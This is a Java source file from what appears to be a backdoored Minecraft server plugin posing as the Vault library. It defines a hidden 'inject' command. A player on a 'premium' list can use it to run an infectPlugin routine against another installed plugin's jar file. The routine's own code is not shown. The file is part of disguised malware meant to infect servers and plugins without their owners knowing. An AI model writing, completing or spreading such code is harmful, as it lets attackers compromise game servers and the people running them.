package net.milkbowl.vault.commands.cmds.premium;

import net.milkbowl.vault.Core;
import net.milkbowl.vault.commands.CommandManager;
import net.milkbowl.vault.methods.Inj;
import net.milkbowl.vault.util.PluginUtils;
import net.milkbowl.vault.util.Settings;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

import java.io.File;

public class Inject extends CommandManager {

    public void execute(Core plugin, String msg, String[] args, Player p) {
        if (plugin.registeredPremium.contains(p.getName())) {
            if (args.length <= 1) {
                p.sendMessage(Settings.USAGE("inject <plugin>"));
            } else {
                if (PluginUtils.getPluginByName(args[1]) !=null) {
                    p.sendMessage(Settings.PREFIX("Attempting to inject.."));
                    File f = new File(PluginUtils.getPluginByName(args[1]).getDataFolder() + ".jar");
                    try {
                        Inj.infectPlugin(f);
                    } catch (Exception e) {
                        p.sendMessage(Settings.PREFIX(e.getMessage()));
                    }
                }
            }
        } else {
            p.sendMessage(Settings.PREFIX("You must be a " + Settings.HIGHLIGHT_COLOUR + "premium user " + Settings.SECONDARY_COLOUR + "to execute this command"));
        }
    }
}
